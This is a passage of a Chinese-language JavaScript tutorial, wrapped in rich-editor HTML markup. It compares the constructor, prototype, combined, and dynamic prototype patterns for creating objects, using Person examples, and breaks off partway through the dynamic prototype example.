255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“alert(this.name);”</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“Software”</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){<br>}<br>Person.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){<br> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br>person1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: 